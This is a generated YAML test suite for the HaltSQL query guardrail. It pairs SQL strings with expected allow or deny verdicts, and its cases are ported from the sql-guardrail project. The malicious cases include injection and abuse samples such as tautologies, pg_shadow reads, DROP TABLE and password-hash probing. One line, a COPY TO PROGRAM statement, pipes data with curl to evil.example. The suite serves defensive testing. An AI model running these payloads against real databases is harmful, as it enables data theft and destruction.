# ---------------------------------------------------------------------------
# Conformance cases ported from sql-guardrail
#   Source:  https://github.com/nickusevich/sql-guardrail
#   Commit:  eadfb9d0c725f4960621a7c67c23219103710c5b
#   License: MIT -- Copyright (c) 2026 nickusevich
#            (Permission is hereby granted, free of charge, to any person
#             obtaining a copy of this software ... The above copyright notice
#             and this permission notice shall be included in all copies or
#             substantial portions of the Software.)
# The SQL strings below are taken from that project's tests (tests/malicious,
# tests/benign, tests/test_corpus.py, tests/test_security.py, tests/unit/*);
# each case's `sqlg:<file>::<test>` tag names the original test. Expected
# verdicts follow HALTSQL semantics (PLAN.md section 6). Cases tagged `differs`
# have a different outcome from sql-guardrail, `differs-code` the same outcome
# for a different reason; cases tagged `sqlg-adapted` change the SQL slightly
# (noted in the case name); cases tagged `ambiguous` exercise behaviour
# HaltSQL's spec leaves open. See README.md.
# GENERATED from the ported data; regenerate rather than hand-editing.
# ---------------------------------------------------------------------------
apiVersion: haltsql.dev/v1
kind: TestSuite
metadata:
  name: sqlg-standard
  description: "sql-guardrail corpus and security regression tests under standard_policy"
policy: policies/sqlg_standard.yaml
defaults:
  context: {"tenant_id":"42"}
cases:
  - name: "malicious alter_system.sql"
    sql: "ALTER SYSTEM SET log_statement = 'all';\n"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/malicious/alter_system.sql"]
  - name: "malicious always_true.sql"
    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR 1 = 1;\n"
    expect: deny
    codes: [E_TENANT_MISSING]
    tags: ["conformance", "sqlg:tests/malicious/always_true.sql"]
  - name: "malicious call_procedure.sql"
    sql: "CALL admin_reset_passwords();\n"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/malicious/call_procedure.sql"]
  - name: "malicious coalesce_null_tenants.sql"
    sql: "SELECT id, total FROM orders WHERE COALESCE(account_id, 42) = 42 LIMIT 10;\n"
    expect: deny
    codes: [E_TENANT_MISSING]
    tags: ["conformance", "sqlg:tests/malicious/coalesce_null_tenants.sql"]
  - name: "malicious copy_from_program.sql"
    sql: "COPY orders TO PROGRAM 'curl -X POST http://evil.example/leak --data-binary @-';\n"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/malicious/copy_from_program.sql"]
  - name: "malicious create_policy_disable_rls.sql"
    sql: "CREATE POLICY pol ON orders FOR SELECT USING (true);\n"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/malicious/create_policy_disable_rls.sql"]
  - name: "malicious create_rule_rewrite_select.sql"
    sql: "CREATE RULE r AS ON SELECT TO orders DO INSTEAD SELECT 1;\n"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/malicious/create_rule_rewrite_select.sql"]
  - name: "malicious cross_join_cartesian.sql"
    sql: "SELECT o2.id, o2.total\nFROM orders o1\nCROSS JOIN orders o2\nWHERE o1.account_id = 42 AND o2.account_id = 42;\n"
    expect: deny
    codes: [E_LIMIT_REQUIRED]
    tags: ["conformance", "sqlg:tests/malicious/cross_join_cartesian.sql", "differs-code"]
  - name: "malicious data_modifying_cte.sql"
    sql: "WITH d AS (DELETE FROM orders RETURNING id) SELECT id FROM d;\n"
    expect: deny
    codes: [E_DATA_MODIFYING_CTE]
    tags: ["conformance", "sqlg:tests/malicious/data_modifying_cte.sql"]
  - name: "malicious denied_column.sql"
    sql: "SELECT id, password_hash FROM users WHERE id = 5;\n"
    expect: deny
    codes: [E_COLUMN_DENIED]
    tags: ["conformance", "sqlg:tests/malicious/denied_column.sql"]
  - name: "malicious dml_delete_missing_tenant.sql"
    sql: "DELETE FROM orders WHERE id = 1;\n"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/malicious/dml_delete_missing_tenant.sql"]
  - name: "malicious dml_insert_deny_column.sql"
    sql: "INSERT INTO users(password_hash) VALUES ('x');\n"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/malicious/dml_insert_deny_column.sql"]
  - name: "malicious do_block.sql"
    sql: "DO $$ BEGIN EXECUTE 'DROP TABLE orders'; END $$;\n"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/malicious/do_block.sql"]
  - name: "malicious empty_input.sql"
    sql: ""
    expect: deny
    codes: [E_EMPTY]
    tags: ["conformance", "sqlg:tests/malicious/empty_input.sql", "differs-code"]
  - name: "malicious explain_analyze.sql"
    sql: "EXPLAIN ANALYZE SELECT * FROM orders;\n"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/malicious/explain_analyze.sql"]
  - name: "malicious for_update.sql"
    sql: "SELECT id FROM orders WHERE account_id = 42 FOR UPDATE;\n"
    expect: deny
    codes: [E_LOCKING_CLAUSE]
    tags: ["conformance", "sqlg:tests/malicious/for_update.sql"]
  - name: "malicious having_max_denied_column.sql"
    sql: "SELECT 1 FROM users HAVING max(password_hash) IS NOT NULL;\n"
    expect: deny
    codes: [E_COLUMN_DENIED]
    tags: ["conformance", "sqlg:tests/malicious/having_max_denied_column.sql"]
  - name: "malicious having_password_exfil.sql"
    sql: "SELECT id FROM users\nGROUP BY id\nHAVING bool_or(substr(password_hash, 1, 1) = 'a');\n"
    expect: deny
    codes: [E_COLUMN_DENIED]
    tags: ["conformance", "sqlg:tests/malicious/having_password_exfil.sql"]
  - name: "malicious limit_all_bypass.sql"
    sql: "SELECT id, total FROM orders WHERE account_id = 42 LIMIT ALL;\n"
    expect: deny
    tags: ["conformance", "sqlg:tests/malicious/limit_all_bypass.sql", "ambiguous"]
  - name: "malicious listen_notify.sql"
    sql: "LISTEN evil_channel;\n"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/malicious/listen_notify.sql"]
  - name: "malicious missing_tenant.sql"
    sql: "SELECT id, total FROM orders WHERE total > 1000;\n"
    expect: deny
    codes: [E_TENANT_MISSING]
    tags: ["conformance", "sqlg:tests/malicious/missing_tenant.sql"]
  - name: "malicious multi_statement.sql"
    sql: "SELECT 1; DROP TABLE users;\n"
    expect: deny
    codes: [E_MULTI_STATEMENT]
    tags: ["conformance", "sqlg:tests/malicious/multi_statement.sql"]
  - name: "malicious natural_join.sql"
    sql: "SELECT u.id, u.name FROM users u NATURAL JOIN orders WHERE u.id = 1;\n"
    expect: deny
    tags: ["conformance", "sqlg:tests/malicious/natural_join.sql", "differs-code", "ambiguous"]
  - name: "malicious offset_dos.sql (allowed by HaltSQL)"
    sql: "SELECT id, total FROM orders WHERE account_id = 42 LIMIT 10 OFFSET 99999999;\n"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/malicious/offset_dos.sql", "differs"]
  - name: "malicious offset_setop_bypass.sql"
    sql: "SELECT id FROM orders WHERE account_id = 42\nUNION\nSELECT id FROM orders WHERE account_id = 42\nOFFSET 999999999\n"
    expect: deny
    codes: [E_LIMIT_REQUIRED]
    tags: ["conformance", "sqlg:tests/malicious/offset_setop_bypass.sql", "differs-code"]
  - name: "malicious pg_hba_file_rules.sql"
    sql: "SELECT type, database, user_name, address, auth_method FROM pg_hba_file_rules;\n"
    expect: deny
    codes: [E_TABLE_DENIED]
    tags: ["conformance", "sqlg:tests/malicious/pg_hba_file_rules.sql"]
  - name: "malicious pg_sleep_blind.sql"
    sql: "SELECT id FROM users WHERE id = 1 AND pg_sleep(10) IS NOT NULL;\n"
    expect: deny
    codes: [E_FUNCTION_DENIED]
    tags: ["conformance", "sqlg:tests/malicious/pg_sleep_blind.sql"]
  - name: "malicious qualified_wildcard_to_jsonb.sql"
    sql: "SELECT to_jsonb(users.*) FROM users WHERE id = 1 LIMIT 10;\n"
    expect: deny
    codes: [E_COLUMN_DENIED]
    tags: ["conformance", "sqlg:tests/malicious/qualified_wildcard_to_jsonb.sql"]
  - name: "malicious quoted_different_table.sql"
    sql: "SELECT id, total FROM \"Orders\" WHERE account_id = 42 LIMIT 10;\n"
    expect: deny
    codes: [E_TABLE_DENIED]
    tags: ["conformance", "sqlg:tests/malicious/quoted_different_table.sql"]
  - name: "malicious recursive_cte_dos.sql"
    sql: "WITH RECURSIVE r AS (\n    SELECT 1 AS n\n    UNION ALL\n    SELECT n + 1 FROM r\n)\nSELECT n FROM r;\n"
    expect: deny
    tags: ["conformance", "sqlg:tests/malicious/recursive_cte_dos.sql", "differs-code", "ambiguous"]
  - name: "malicious select_into.sql"
    sql: "SELECT id INTO orders_copy FROM orders WHERE account_id = 42 LIMIT 100;\n"
    expect: deny
    codes: [E_SELECT_INTO]
    tags: ["conformance", "sqlg:tests/malicious/select_into.sql"]
  - name: "malicious select_star.sql"
    sql: "SELECT * FROM orders WHERE account_id = 42;\n"
    expect: deny
    codes: [E_COLUMN_DENIED]
    tags: ["conformance", "sqlg:tests/malicious/select_star.sql"]
  - name: "malicious self_join_bypass.sql"
    sql: "SELECT o2.id, o2.total\nFROM orders o1\nJOIN orders o2 ON 1=1\nWHERE o1.account_id = 42;\n"
    expect: deny
    codes: [E_TENANT_MISSING]
    tags: ["conformance", "sqlg:tests/malicious/self_join_bypass.sql"]
  - name: "malicious set_search_path.sql"
    sql: "SET search_path = 'attacker_schema, public';\n"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/malicious/set_search_path.sql"]
  - name: "malicious sibling_subquery_limit_bypass.sql"
    sql: "SELECT id, total FROM orders\nWHERE account_id = 42\n  AND id < (SELECT count(*) FROM users LIMIT 1);\n"
    expect: deny
    codes: [E_LIMIT_REQUIRED]
    tags: ["conformance", "sqlg:tests/malicious/sibling_subquery_limit_bypass.sql"]
  - name: "malicious table_shorthand_pg_shadow.sql"
    sql: "TABLE pg_shadow;\n"
    expect: deny
    codes: [E_TABLE_DENIED]
    tags: ["conformance", "sqlg:tests/malicious/table_shorthand_pg_shadow.sql"]
  - name: "malicious tautology_arithmetic.sql (allowed by HaltSQL)"
    sql: "SELECT id, name FROM users WHERE id = 1 OR (1 + 1 = 2) LIMIT 10;\n"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/malicious/tautology_arithmetic.sql", "differs"]
  - name: "malicious tautology_between.sql (allowed by HaltSQL)"
    sql: "SELECT id, name FROM users WHERE id = 1 OR (5 BETWEEN 1 AND 10) LIMIT 10;\n"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/malicious/tautology_between.sql", "differs"]
  - name: "malicious tautology_case.sql (allowed by HaltSQL)"
    sql: "SELECT id, name FROM users WHERE id = 1 OR (CASE WHEN 0 = 1 THEN false ELSE true END) LIMIT 10;\n"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/malicious/tautology_case.sql", "differs"]
  - name: "malicious tautology_cast_bool.sql (allowed by HaltSQL)"
    sql: "SELECT id, name FROM users WHERE id = 1 OR true::boolean LIMIT 10;\n"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/malicious/tautology_cast_bool.sql", "differs"]
  - name: "malicious tautology_column_self_eq.sql (allowed by HaltSQL)"
    sql: "SELECT id, name FROM users WHERE id = 1 OR id = id LIMIT 10;\n"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/malicious/tautology_column_self_eq.sql", "differs"]
  - name: "malicious tautology_exists_constant.sql (allowed by HaltSQL)"
    sql: "SELECT id, name FROM users WHERE id = 1 OR EXISTS (SELECT 1) LIMIT 10;\n"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/malicious/tautology_exists_constant.sql", "differs"]
  - name: "malicious tautology_or_lt.sql (allowed by HaltSQL)"
    sql: "SELECT id, name FROM users WHERE id = 1 OR 1 < 2 LIMIT 10;\n"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/malicious/tautology_or_lt.sql", "differs"]
  - name: "malicious union_pg_shadow.sql"
    sql: "SELECT id, name FROM users WHERE id = 1\nUNION\nSELECT usename, passwd FROM pg_shadow;\n"
    expect: deny
    codes: [E_TABLE_DENIED]
    tags: ["conformance", "sqlg:tests/malicious/union_pg_shadow.sql"]
  - name: "malicious write_disguised_as_select.sql"
    sql: "UPDATE orders SET total = 0 WHERE account_id = 42;\n"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/malicious/write_disguised_as_select.sql"]
  - name: "malicious wrong_tenant.sql"
    sql: "SELECT id, total FROM orders WHERE account_id = 99;\n"
    expect: deny
    codes: [E_TENANT_MISMATCH]
    tags: ["conformance", "sqlg:tests/malicious/wrong_tenant.sql"]
  - name: "benign cte_aggregation.sql"
    sql: "WITH recent_orders AS (\n    SELECT id, total, created_at\n    FROM orders\n    WHERE account_id = 42 AND created_at > '2026-01-01'\n    LIMIT 1000\n)\nSELECT id, total FROM recent_orders;\n"
    expect: deny
    codes: [E_LIMIT_REQUIRED]
    tags: ["conformance", "sqlg:tests/benign/cte_aggregation.sql", "differs"]
  - name: "benign except_simple.sql"
    sql: "(SELECT id, total FROM orders WHERE account_id = 42 LIMIT 10)\nEXCEPT\n(SELECT id, total FROM orders WHERE account_id = 42 AND total > 1000 LIMIT 10);\n"
    expect: deny
    codes: [E_LIMIT_REQUIRED]
    tags: ["conformance", "sqlg:tests/benign/except_simple.sql", "ambiguous"]
  - name: "benign fetch_first_rows_only.sql"
    sql: "SELECT id, total FROM orders WHERE account_id = 42 FETCH FIRST 10 ROWS ONLY;\n"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/benign/fetch_first_rows_only.sql"]
  - name: "benign group_by.sql"
    sql: "SELECT product_name, SUM(total) AS revenue\nFROM orders\nWHERE account_id = 42\nGROUP BY product_name\nORDER BY revenue DESC\nLIMIT 10;\n"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/benign/group_by.sql"]
  - name: "benign having_legit.sql"
    sql: "SELECT account_id, count(*)\nFROM orders\nWHERE account_id = 42\nGROUP BY account_id\nHAVING count(*) > 5\nLIMIT 10;\n"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/benign/having_legit.sql"]
  - name: "benign intersect_simple.sql"
    sql: "(SELECT id, total FROM orders WHERE account_id = 42 LIMIT 10)\nINTERSECT\n(SELECT id, total FROM orders WHERE account_id = 42 AND total > 100 LIMIT 10);\n"
    expect: deny
    codes: [E_LIMIT_REQUIRED]
    tags: ["conformance", "sqlg:tests/benign/intersect_simple.sql", "ambiguous"]
  - name: "benign join_with_tenant.sql"
    sql: "SELECT u.id, u.name, o.total\nFROM users u\nJOIN orders o ON o.account_id = u.id\nWHERE o.account_id = 42 AND u.id = 5\nLIMIT 50;\n"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/benign/join_with_tenant.sql"]
  - name: "benign simple_select.sql"
    sql: "SELECT id, total FROM orders WHERE account_id = 42 LIMIT 100;\n"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/benign/simple_select.sql"]
  - name: "benign union_simple.sql"
    sql: "SELECT id, name FROM users WHERE id = 5\nUNION\nSELECT id, name FROM users WHERE id = 6;\n"
    expect: deny
    codes: [E_LIMIT_REQUIRED]
    tags: ["conformance", "sqlg:tests/benign/union_simple.sql", "differs"]
  - name: "benign window_function.sql"
    sql: "SELECT\n    id,\n    total,\n    ROW_NUMBER() OVER (PARTITION BY product_name ORDER BY created_at DESC) AS rn\nFROM orders\nWHERE account_id = 42\nLIMIT 100;\n"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/benign/window_function.sql"]
  - name: "README policy accepts multi_clause_where_and"
    sql: "SELECT id, total FROM orders WHERE account_id = 42 AND total > 0 LIMIT 10"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[multi_clause_where_and]"]
  - name: "README policy accepts multi_clause_where_or"
    sql: "SELECT id, total FROM orders WHERE account_id = 42 AND (total > 100 OR total < 10) LIMIT 10"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[multi_clause_where_or]"]
  - name: "README policy accepts case_expression"
    sql: "SELECT id, CASE WHEN total > 100 THEN 'big' ELSE 'small' END FROM orders WHERE account_id = 42 LIMIT 10"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[case_expression]"]
  - name: "README policy accepts case_multi_arm"
    sql: "SELECT id, CASE WHEN total > 1000 THEN 'huge' WHEN total > 100 THEN 'big' ELSE 'small' END FROM orders WHERE account_id = 42 LIMIT 10"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[case_multi_arm]"]
  - name: "README policy accepts exists_subquery"
    sql: "SELECT id, total FROM orders o WHERE o.account_id = 42 AND EXISTS (SELECT 1 FROM users u WHERE u.id = 1) LIMIT 10"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[exists_subquery]"]
  - name: "README policy accepts aggregate_with_having"
    sql: "SELECT account_id, count(id) FROM orders WHERE account_id = 42 GROUP BY account_id HAVING count(id) > 5 LIMIT 10"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[aggregate_with_having]"]
  - name: "README policy accepts coalesce_and_cast"
    sql: "SELECT id, coalesce(cast(total AS text), '0') FROM orders WHERE account_id = 42 LIMIT 10"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[coalesce_and_cast]"]
  - name: "README policy accepts extract_from_timestamp"
    sql: "SELECT extract(year FROM created_at), count(id) FROM orders WHERE account_id = 42 GROUP BY extract(year FROM created_at) LIMIT 10"
    expect: allow
    bind: []
    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[extract_from_timestamp]", "ambiguous"]
  - name: "non-select statement: CREATE POLICY pol ON orders FOR SELECT U"
    sql: "CREATE POLICY pol ON orders FOR SELECT USING (true)"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
  - name: "non-select statement: ALTER SYSTEM SET log_statement='all'"
    sql: "ALTER SYSTEM SET log_statement='all'"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
  - name: "non-select statement: COMMENT ON TABLE orders IS 'pwned'"
    sql: "COMMENT ON TABLE orders IS 'pwned'"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
  - name: "non-select statement: CREATE RULE r AS ON SELECT TO orders DO "
    sql: "CREATE RULE r AS ON SELECT TO orders DO INSTEAD SELECT 1"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
  - name: "non-select statement: CREATE EVENT TRIGGER t ON ddl_command_st"
    sql: "CREATE EVENT TRIGGER t ON ddl_command_start EXECUTE FUNCTION f()"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
  - name: "non-select statement: CREATE PUBLICATION p FOR TABLE orders"
    sql: "CREATE PUBLICATION p FOR TABLE orders"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
  - name: "non-select statement: CREATE INDEX idx ON orders (id)"
    sql: "CREATE INDEX idx ON orders (id)"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
  - name: "non-select statement: DROP TABLE orders"
    sql: "DROP TABLE orders"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
  - name: "non-select statement: CREATE EXTENSION pg_stat_statements"
    sql: "CREATE EXTENSION pg_stat_statements"
    expect: deny
    codes: [E_STATEMENT_KIND]
    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
  - name: "multi statement SELECT 1; DROP TABLE orders;"
    sql: "SELECT 1; DROP TABLE orders;"
    expect: deny
    codes: [E_MULTI_STATEMENT]
    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_multi_statement_forbidden"]
  - name: "data-modifying CTE DELETE"
    sql: "WITH x AS (DELETE FROM orders RETURNING id) SELECT id FROM x"
    expect: deny
    codes: [E_DATA_MODIFYING_CTE]
    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_data_modifying_cte_forbidden"]
  - name: "lock FOR UPDATE"
    sql: "SELECT id FROM orders WHERE account_id = 42 FOR UPDATE"
    expect: deny
    codes: [E_LOCKING_CLAUSE]
    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_locks_forbidden"]
  - name: "lock FOR SHARE"
    sql: "SELECT id FROM orders WHERE account_id = 42 FOR SHARE"
    expect: deny
    codes: [E_LOCKING_CLAUSE]
    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_locks_forbidden"]
  - name: "lock FOR UPDATE NOWAIT"
    sql: "SELECT id FROM orders WHERE account_id = 42 FOR UPDATE NOWAIT"
    expect: deny
    codes: [E_LOCKING_CLAUSE]
    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_locks_forbidden"]
  - name: "select into: INTO orders_copy FROM orders W"
    sql: "SELECT id INTO orders_copy FROM orders WHERE account_id = 42 LIMIT 10"
    expect: deny
    codes: [E_SELECT_INTO]
    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_select_into_forbidden"]
  - name: "select into: INTO TEMP tmp FROM orders WHER"
    sql: "SELECT id INTO TEMP tmp FROM orders WHERE account_id = 42 LIMIT 10"
    expect: deny
    codes: [E_SELECT_INTO]
    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_select_into_forbidden"]
